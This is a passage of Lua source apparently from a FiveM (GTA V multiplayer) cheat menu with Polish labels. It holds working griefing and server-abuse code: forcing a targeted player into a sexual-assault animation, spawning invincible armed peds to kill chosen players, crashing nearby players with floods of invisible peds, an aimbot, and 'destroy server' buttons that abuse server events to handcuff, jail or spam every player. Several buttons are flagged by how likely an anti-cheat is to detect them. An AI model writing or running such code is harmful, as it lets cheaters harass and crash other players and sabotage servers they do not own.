                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count + 0.4
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened(SPD) then
              if LR.Button("~w~Zaatakuj gracza ~r~[Ryzykowne]") then
                local pedname = "s_m_y_swat_01"
                local wep = "WEAPON_ASSAULTRIFLE"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
                local pedname = "s_m_y_swat_01"
                local wep = "weapon_rpg"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
                local pedname = "s_m_y_swat_01"
                local wep = "weapon_flaregun"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
                local pedname = "s_m_y_swat_01"
                local wep = "weapon_railgun"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              end

              if LR.Button("~w~Atak meneli ~r~[Ryzykowne]") then
                local pedname = "a_f_m_fatcult_01"
                local wep = "WEAPON_KNIFE"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
                local pedname = "a_m_m_acult_01"
                local wep = "weapon_hammer"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
                local pedname = "a_m_o_soucent_03"
                local wep = "weapon_bat"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
                local pedname = "a_m_y_acult_01"
                local wep = "weapon_bottle"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              end
			  
              LR.Display()        
            elseif IsDisabledControlPressed(0, 348) then
              LR.OpenMenu(LynxIcS)
            elseif IsDisabledControlPressed(0, 0) then
              ToggleAimbottpp()
              LR.Display()
            elseif LR.IsMenuOpened(TRPM) then
              if LR.Button("~w~Teleportuj do znacznika") then
                TeleportToWaypoint()
              elseif LR.Button("~w~Teleportuj do pojazdu") then
                teleporttonearestvehicle()
              elseif LR.Button("~w~Teleportuj na współrzędne") then
                teleporttocoords()
              elseif LR.Button("~w~Narysuj customowe znaczniki na mapie") then
                drawcoords()
              elseif LR.CheckBox("~w~Pokaż współrzędne", showCoords, function (enabled) showCoords = enabled end) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(WMPS) then
              if LR.MenuButton("~w~Daj pojedynczą broń ~r~[Ryzykowne]                                                >", WTNe) then
              elseif LR.MenuButton("~w~Celownik                                                                      >", CMSMS) then

              elseif LR.Button("~w~Daj wszystkie bronie ~r~[Największe ryzyko]") then
                for i = 1, #allWeapons do
                  GiveWeaponToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 1000, false, false)
                end
              elseif LR.Button("~w~Usuń wszystkie bronie ~r~[Największe ryzyko]") then
                RemoveAllPedWeapons(PlayerPedId(-1), true)

              elseif LR.Button("~w~Wyrzuć broń") then
                local a = GetPlayerPed(-1)
                local b = GetSelectedPedWeapon(a)
                SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)

              

			  elseif LR.Button("Daj amunicję [Może być ryzykowne]") then
				local result = KeyboardInput("ilosc", "", 100)
				if result ~= "" then
				for i = 1, #allWeapons do AddAmmoToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), result) end
				end
              elseif LR.CheckBox("Pojazdowa broń",VehicleGun, function(enabled)VehicleGun = enabled end)  then
              elseif LR.CheckBox("Broń usuwająca",DeleteGun, function(enabled)DeleteGun = enabled end)  then
              end


              LR.Display()
            elseif LR.IsMenuOpened(VMS) then
              if LR.MenuButton("~w~Zboostuj pojazd                                                               >", bmm) then
              elseif LR.MenuButton("~w~Lista pojazdów                                                                  >", CTSa) then
              elseif LR.MenuButton("~w~Wszystkie troll pojazdy                                                                  >", gccccc) then
              elseif LR.Button("~w~Zresp customowy pojazd") then
                spawnvehicle()
              elseif LR.Button("~w~Zmień rejestrację") then
                changeregistrations()
              elseif LR.Button("~w~Usuń pojazd") then
                DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif LR.Button("~w~Napraw pojazd") then
                repairvehicle()
              elseif LR.Button("~w~Napraw silnik") then
                repairengine()
              elseif LR.Button("~w~Obróć pojazd") then
                daojosdinpatpemata()
              elseif LR.Button("~w~Maksymalny tuning") then
                MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif LR.CheckBox("~w~Niezniszczalność", VehGod, function(enabled) VehGod = enabled end) then
              elseif LR.CheckBox("~w~Niewidzialność", VehInv, function(enabled) VehInv = enabled end) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(gccccc) then
              if LR.CheckBox("~w~EMP ~s~rozwal pojazdy", destroyvehicles, function(enabled) destroyvehicles = enabled end) then
			  elseif LR.CheckBox("~w~Usuń ~s~pojazd", deletenearestvehicle, function(enabled) deletenearestvehicle = enabled end) then
			  elseif LR.CheckBox("~w~Przewróć ~s~pojazdy", lolcars, function(enabled) lolcars = enabled end) then
              elseif LR.CheckBox("~w~Włącz alarmy ~s~w pojazdach", alarmvehicles, function(enabled) alarmvehicles = enabled end) then
              elseif LR.Button("~w~Burger ~s~ na pojazdy") then
                local hamburghash = GetHashKey("xs_prop_hamburgher_wl")
                for vehicle in EnumerateVehicles() do
                  local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                  AttachEntityToEntity(hamburger, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                end
              elseif LR.CheckBox("~w~Wysadź ~s~pojazd", explodevehicles, function(enabled) explodevehicles = enabled end) then
              elseif LR.CheckBox("~w~Rozwal opony w ~s~pojazdach", fuckallcars, function(enabled) fuckallcars = enabled end) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(advm) then
              if LR.MenuButton("~w~Destrukcyjne ~s~Menu                                                           >", dddd) then
              elseif LR.MenuButton("~w~FiveZ ~g~Menu                                                                        ~s~>", fivez) then
              elseif LR.CheckBox("Znaczniki Graczy", bBlips, function(bBlips) end) then
                showblip = not showblip
                bBlips = showblip
              elseif LR.CheckBox("Nazwa i ID graczy nad głową", nameabove, function(enabled) nameabove = enabled end) then
			  elseif LR.CheckBox("~w~Tryb Jezusa", dio, function(enabled) dio = enabled end) then
              elseif LR.ComboBox("~w~Zasięg trybu Jezusa", JesusRadiusOps, currJesusRadiusIndex, selJesusRadiusIndex, function(currentIndex, selectedIndex)
                currJesusRadiusIndex = currentIndex
                selJesusRadiusIndex = currentIndex
                JesusRadius = JesusRadiusOps[currentIndex]
				end) then
                elseif LR.CheckBox("~w~Magnes", magnet, function(enabled) MagnetoBoy() end) then
                end

                LR.Display()
              elseif LR.IsMenuOpened(CMSMS) then
                if LR.CheckBox("~w~Oryginalny ~s~Celownik", crosshair, function (enabled) crosshair = enabled crosshairc = false crosshairc2 = false end) then
                elseif LR.CheckBox("~w~Krzyżykowy ~s~Celownik", crosshairc, function (enabled) crosshair = false crosshairc = enabled crosshairc2 = false end) then
                elseif LR.CheckBox("~w~Kropkowy ~s~Celownik", crosshairc2, function (enabled) crosshair = false crosshairc = false crosshairc2 = enabled end) then
                end

                LR.Display()
			  elseif LR.IsMenuOpened(GAPA) then
                if LR.Button("Masowa destrukcja") then
                  bananapartyall()
                  cageall()
                  borgarall()
                  yachtall()
                elseif LR.Button("Wysadź graczy") then
                  explodeall()
                elseif LR.Button("Daj bronie") then
                weaponsall()
				        elseif LR.CheckBox( "Wyłącz pojazdy", cardz, function(enabled) cardz = enabled end) then
				        elseif LR.CheckBox( "Wyłącz bronie", gundz, function(enabled) gundz = enabled end) then
                elseif LR.CheckBox( "Taze graczy", ostrajazda, function(enabled) ostrajazda = enabled end) then
                elseif LR.CheckBox( "Spam pojazdami", mocneautka, function(enabled) mocneautka = enabled end) then
                elseif LR.Button("~w~Zresp propa ~b~[Textbox]") then
                  -- Textbox GTA
                  AddTextEntry('FMMC_KEY_TIP1', 'Wpisz nazwę propa')
                  DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", "prop_juicestand", "", "", "", 64)

                  while UpdateOnscreenKeyboard() == 0 do
                      DisableAllControlActions(0)
                      Citizen.Wait(0)
                  end
                
                  if UpdateOnscreenKeyboard() == 1 then
                      local propName = GetOnscreenKeyboardResult()
                  
                      if propName ~= nil and propName ~= "" then
                          local playerPed = PlayerPedId()
                          local coords = GetEntityCoords(playerPed)
                          local heading = GetEntityHeading(playerPed)
                      
                          local propHash = GetHashKey(propName)
                          RequestModel(propHash)
                      
                          while not HasModelLoaded(propHash) do
                              Citizen.Wait(0)
                          end
                        
                          local prop = CreateObject(
                              propHash,
                              coords.x,
                              coords.y,
                              coords.z - 1.0,
                              true,
                              true,
                              false
                          )
                        
                          SetEntityHeading(prop, heading)
                          PlaceObjectOnGroundProperly(prop)
                          SetModelAsNoLongerNeeded(propHash)
                      end
                  end
                

                elseif LR.Button( "Scrashuj najbliższych graczy") then
                 local isSpawning = false 
                  local hasRun = false 


                  function GetClosestPlayer()
                      local playerPed = PlayerPedId()
                      local playerCoords = GetEntityCoords(playerPed)
                      local closestPlayer = -1
                      local closestDistance = math.huge
                  
                      for _, playerId in ipairs(GetActivePlayers()) do
                          if playerId ~= PlayerId() then -- Exclude the local player
                              local targetPed = GetPlayerPed(playerId)
                              if DoesEntityExist(targetPed) and NetworkIsPlayerActive(playerId) then
                                  local targetCoords = GetEntityCoords(targetPed)
                                  local distance = #(playerCoords - targetCoords)
                                  if distance < closestDistance then
                                      closestDistance = distance
                                      closestPlayer = playerId
                                  end
                              end
                          end
                      end
                    
                      return closestPlayer
                  end
                
                
                  function ForceDeleteAllPeds(spawnedPeds, pedModel)
                      for _, ped in ipairs(spawnedPeds) do
                          if DoesEntityExist(ped) then
                              DeleteEntity(ped)
                          end
                      end
                      if pedModel then
                          SetModelAsNoLongerNeeded(pedModel)
                      end
                  end
                
                
                  function SpawnPedsAtPlayer2()
                      if isSpawning or hasRun then return end
                      isSpawning = true
                      hasRun = true
                  
                      local playerPed = PlayerPedId()
                      local selectedPlayer = GetClosestPlayer()
                  
                      if selectedPlayer == -1 then
                          isSpawning = false
                          hasRun = false
                          return
                      end
                    
                      local targetPed = GetPlayerPed(selectedPlayer)
                    
                      if DoesEntityExist(targetPed) and targetPed ~= playerPed and NetworkIsPlayerActive(selectedPlayer) then
                          local pedModel = GetHashKey("cs_wade")
                          RequestModel(pedModel)
                          while not HasModelLoaded(pedModel) do
                              Citizen.Wait(100)
                          end
                        
                          local spawnedPeds = {}
                          local maxPedsPerBatch = 5
                          local maxIterations = 22
                        
                          for i = 0, maxIterations - 1 do
                              targetPed = GetPlayerPed(selectedPlayer)
                              if not DoesEntityExist(targetPed) or not NetworkIsPlayerActive(selectedPlayer) then
                                  ForceDeleteAllPeds(spawnedPeds, pedModel)
                                  break
                              end
                            
                              local coords = GetEntityCoords(targetPed)
                              if not coords then
                                  ForceDeleteAllPeds(spawnedPeds, pedModel)
                                  break
                              end
                            
                              for j = 1, maxPedsPerBatch do
                                  local offsetX = math.random(-3.0, 3.0)
                                  local offsetY = math.random(-3.0, 3.0)
                                  local foundGround, groundZ = GetGroundZFor_3dCoord(coords.x + offsetX, coords.y + offsetY, coords.z + 2.0)
                                  local spawnZ = foundGround and groundZ or coords.z
                                  local ped = CreatePed(28, pedModel, coords.x + offsetX, coords.y + offsetY, spawnZ, math.random(0, 360), true, false)
                                  if DoesEntityExist(ped) then
                                      SetEntityAlpha(ped, 0, false)
                                      SetEntityVisible(ped, false, false)
                                      FreezeEntityPosition(ped, true)
                                      SetEntityCompletelyDisableCollision(ped, false, false)
                                      SetEntityCollision(ped, false, false)
                                      SetEntityNoCollisionEntity(ped, playerPed, true)
                                      SetEntityNoCollisionEntity(playerPed, ped, true)
                                      SetEntityNoCollisionEntity(ped, ped, true)
                                      SetPedConfigFlag(ped, 292, true)
                                      SetPedConfigFlag(ped, 301, true)
                                      SetPedConfigFlag(ped, 128, true)
                                      SetPedConfigFlag(ped, 287, true)
                                      SetEntityCanBeDamaged(ped, false)
                                      SetEntityInvincible(ped, true)
                                      SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                                      SetPedCanRagdoll(ped, false)
                                      SetPedCanRagdollFromPlayerImpact(ped, false)
                                      SetPedConfigFlag(ped, 17, true)
                                      SetPedConfigFlag(ped, 297, true)
                                      SetPedConfigFlag(ped, 281, true)
                                      SetPedConfigFlag(ped, 435, true)
                                      SetPedConfigFlag(ped, 430, true)
                                      SetPedConfigFlag(ped, 223, true)
                                      SetPedConfigFlag(ped, 229, true)
                                      SetPedConfigFlag(ped, 149, true)
                                      SetBlockingOfNonTemporaryEvents(ped, true)
                                      SetPedFleeAttributes(ped, 0, false)
                                      SetPedCombatAttributes(ped, 46, false)
                                      SetPedCombatAttributes(ped, 5, false)
                                      SetPedCombatAttributes(ped, 17, false)
                                      SetPedCombatAttributes(ped, 0, false)
                                      SetPedCombatAbility(ped, 0)
                                      SetPedCombatRange(ped, 0)
                                      SetPedCombatMovement(ped, 0)
                                      SetPedAsEnemy(ped, false)
                                      DisablePedPainAudio(ped, true)
                                      SetPedMute(ped, true)
                                      SetAudioFlag("DisablePedSpeech", true)
                                      StopPedSpeaking(ped, true)
                                      SetPedSeeingRange(ped, 0.0)
                                      SetPedHearingRange(ped, 0.0)
                                      SetPedAlertness(ped, 0)
                                      TaskWanderInArea(ped, coords.x, coords.y, spawnZ, 10.0, 10.0, 10.0)
                                      SetPedAsNoLongerNeeded(ped)
                                      table.insert(spawnedPeds, ped)
                                  end
                              end
                              Citizen.Wait(250)
                          end
                          SetModelAsNoLongerNeeded(pedModel)
                        
                        
                          Citizen.CreateThread(function()
                              Citizen.Wait(3000)
                              ForceDeleteAllPeds(spawnedPeds, pedModel)
                              isSpawning = false
                              hasRun = false
                          end)
                      else
                      
                          isSpawning = false
                          hasRun = false
                      end
                  end
                
                
                  Citizen.CreateThread(function()
                      SpawnPedsAtPlayer2()
                  end)
                

                end
                LR.Display()
              elseif LR.IsMenuOpened(dddd) then
                if LR.Button("~w~Zepsuj serwer ~r~[WYKRYTE]") then
                  nukeserver()
                elseif LR.Button("~w~Zepsuj serwer VRP") then
                  vrpdestroy()
                elseif LR.Button("~w~Zakuj ~s~serwer ~r~[WYKRYTE] ") then
                  TriggerServerEvent('esx_policejob:handcuffhype', -1)
                elseif LR.Button("~w~Wyślij do więzienia cały serwer ~r~[WYKRYTE]") then
                  for i = 0, 200 do
                  TriggerEvent('esx_jailer:wpierdolchuja', i, 10 * 60)
                  end
                elseif LR.Button("~w~Stwórz ~s~Znacznik ~r~[WYKRYTE]") then
                  local blips = {
                    {title="#1 YT: Patryksu", colour=48, id=156, x = 730.41528320313, y = -2038.1365966797, z = 29.427337646484},
                    {title="#2 DC: discord.gg/5GMHtjKZ7F", colour=48, id=156, x = 609.75463867188, y = 2734.1340332031, z = 42.05110168457},
                  }
                       
                  Citizen.CreateThread(function()
                  
                     for _, info in pairs(blips) do
                       info.blip = AddBlipForCoord(info.x, info.y, info.z)
                       SetBlipSprite(info.blip, info.id)
                       SetBlipDisplay(info.blip, 4)
                       SetBlipScale(info.blip, 1.0)
                       SetBlipColour(info.blip, info.colour)
                       SetBlipAsShortRange(info.blip, true)
                       BeginTextCommandSetBlipName("STRING")
                       AddTextComponentString(info.title)
                       EndTextCommandSetBlipName(info.blip)
                     end
                  end)
                                    
              elseif LR.Button("~w~Spam ~s~wiadomościami ~r~[WYKRYTE]") then
                for i = 0, 200 do
                  TriggerServerEvent("esx_policejob:message", i, "~o~YT: Patryksu ")
                end
              elseif LR.Button("~w~Zresp rampy na cały ~s~serwer ~r~[Może być wykryte]") then
                for i = 0, 200 do
        
                end
                Wait(100)
                CreateThread(function()
                  while true do
                      Wait(500)
                      TriggerServerEvent("esx_policejob:requestarrest", -1, 0.0, vector3(0.0,0.0,100.0), vector3(0.0,0.0,100.0))
                  end
                end)
                Wait(100)
                for vehicle in EnumerateVehicles() do
                  local ramp = CreateObject(-145066854, 0, 0, 0, true, true, true)
                  NetworkRequestControlOfEntity(vehicle)
                  AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                  NetworkRequestControlOfEntity(ramp)
                  SetEntityAsMissionEntity(ramp, true, true)
                end
              end

                LR.Display()
              elseif LR.IsMenuOpened(WTNe) then
                for k, v in pairs(l_weapons) do
                  if LR.MenuButton("~w~"..k, WTSbull) then
                    WeaponTypeSelect = v
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(fivez) then
                if LR.Button("Zlootuj wszystkie rozbite helki") then
                   CreateThread(function()
                      for first = 1, 40 do
                          for second = 1, 4 do
                              TriggerServerEvent("helicrash:server:giveLoot", first, second)
                              Wait(20)  -- mała przerwa żeby nie wyjebać gry
                          end
                      end
                  end)
                elseif LR.Button("Zresp limitke latającego bałwana") then
                   local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local vehiclehash = GetHashKey("snowman")  -- stały pojazd snowman
                    RequestModel(vehiclehash)

                    Citizen.CreateThread(function()
                        local waiting = 0
                        while not HasModelLoaded(vehiclehash) do
                            waiting = waiting + 100
                            Citizen.Wait(100)
                            if waiting > 5000 then
                                ShowNotification("~r~Nie możesz zrespić tego pojazdu.")
                                return
                            end
                        end
                      
                        local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, true, false)
                        SetVehicleStrong(SpawnedCar, true)
                        SetVehicleEngineOn(SpawnedCar, true, true, false)
                        SetVehicleEngineCanDegrade(SpawnedCar, false)
                      
                        if spawninside then
                            SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
                        end
                    end)
                  elseif LR.Button("Zresp zepsutą torbę z lootem") then
                        local propName = "ba_prop_battle_bag_01b"
                        local playerPed = PlayerPedId()
                        local coords = GetEntityCoords(playerPed)
                        local heading = GetEntityHeading(playerPed)

                        local propHash = GetHashKey(propName)
                        RequestModel(propHash)

                        while not HasModelLoaded(propHash) do
                            Citizen.Wait(0)
                        end
                      
                        local prop = CreateObject(
                            propHash,
                            coords.x,
                            coords.y,
                            coords.z - 1.0,
                            true,
                            true,
                            false
                        )
                      
                        SetEntityHeading(prop, heading)
                        PlaceObjectOnGroundProperly(prop)
                        SetModelAsNoLongerNeeded(propHash)
                end
                LR.Display()
              elseif LR.IsMenuOpened(RESO) then
                for i = 0, #RwFbMFt4elf6NNUg0kg do
                  if LR.MenuButton("~w~"..RwFbMFt4elf6NNUg0kg[i], RESO) then
                  end
              end
                LR.Display()
              elseif LR.IsMenuOpened(WTSbull) then
                for k, v in pairs(WeaponTypeSelect) do
                  if LR.MenuButton(v.name, WOP) then
                    WeaponSelected = v
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(WOP) then
                if LR.Button("~w~Zresp broń") then
                  GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, false)
                end
                if LR.Button("~w~Dodaj amunicję") then
                  SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000)
                end
                if LR.CheckBox("~w~Nieskończona amunicja", WeaponSelected.bInfAmmo, function(s)
                end) then
                  WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
                  SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
                  SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                  PedSkipNextReloading(GetPlayerPed(-1))
                  SetPedShootRate(GetPlayerPed(-1), 1000)
                end
                for k, v in pairs(WeaponSelected.mods) do
                  if LR.MenuButton("~w~"..k, MSMSA) then
                    ModSelected = v
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(MSMSA) then
                for _, v in pairs(ModSelected) do
                  if LR.Button(v.name) then
                    GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
                  end
                end

                LR.Display()
              elseif LR.IsMenuOpened(CTSa) then
                for i, aName in ipairs(CarTypes) do
                  if LR.MenuButton("~w~"..aName, CTS) then
                    carTypeIdx = i
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(CTS) then
                for i, aName in ipairs(CarsArray[carTypeIdx]) do
                  if LR.MenuButton("~w~"..aName, cAoP) then
                    carToSpawn = i
                  end
                end
                LR.Display()
